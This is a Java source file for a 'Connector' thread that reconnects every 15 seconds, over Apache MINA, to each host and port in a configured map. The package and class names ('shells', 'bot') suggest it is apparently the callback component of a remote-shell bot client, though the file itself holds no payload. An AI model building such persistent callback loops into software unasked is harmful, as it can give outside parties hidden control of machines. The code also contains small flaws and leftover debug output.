package com.github.kvac.shells.shells.bot.network;

import com.github.kvac.shells.shells.bot.header.SHELLHEADER;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.ScheduledExecutorService;

import org.slf4j.LoggerFactory;
import com.google.common.eventbus.Subscribe;
import java.net.InetSocketAddress;
import java.net.SocketAddress;
import java.util.Map;
import lombok.Getter;
import org.apache.commons.lang.StringUtils;
import org.apache.mina.core.future.ConnectFuture;
import org.apache.mina.core.session.IoSession;
import org.slf4j.Logger;

/**
 *
 * @author jdcs_dev
 */
public class Connector extends Thread implements Runnable {

    @Getter
    protected final Logger loggerJ = LoggerFactory.getLogger(getClass());

    final ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor();

    public Connector() {
        SHELLHEADER.getSTOP_EVENT_BUS().register(this);
    }

    @Override
    public void run() {

        executorService.scheduleAtFixedRate(connectAll(), 0, 15, TimeUnit.SECONDS);

    }

    private Runnable connectAll() {
        return () -> {
            for (Map.Entry<String, Integer> entry : SHELLHEADER.getCAC().entrySet()) {

                System.out.println("com.github.kvac.minecraft.minashells.network.Connector.connectAll(3)");
                String host = entry.getKey();
                int port = entry.getValue();

                if (!connected(SHELLHEADER.getNIOCONNECTOR().getManagedSessions(), host, port)) {
                    //CHECK EXIST CONNECTION
                    System.err.println(host + ":" + port);
                    connect(host, port);
                    //CHECK EXIST CONNECTION
                }
            }
        };
    }

    private boolean connected(Map<Long, IoSession> managedSessions, String host, int port) {
        Map<Long, IoSession> minaSessions = SHELLHEADER.getNIOCONNECTOR().getManagedSessions();
        for (Map.Entry<Long, IoSession> entrySession : minaSessions.entrySet()) {
            IoSession session = entrySession.getValue();
            SocketAddress raddr = session.getRemoteAddress();

            String Rhost = StringUtils.substringBetween(raddr.toString(), "/", ":");
            int Rport = Integer.parseInt(StringUtils.substringAfter(raddr.toString(), ":"));
            if (Rhost.equals(host) && Rport == port) {
                return true;
            }
        }
        return false;
    }

    private void connect(String host, int port) {
        ConnectFuture cf = null;
        try {
            cf = SHELLHEADER.getNIOCONNECTOR().connect(new InetSocketAddress(host, port));
            cf.awaitUninterruptibly();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Subscribe
    private void stopAll(String string) throws InterruptedException {//TODO SWITCH
        executorService.shutdownNow();
        this.join();//FIXME ?
        SHELLHEADER.getSTOP_EVENT_BUS().register(this);
    }

}
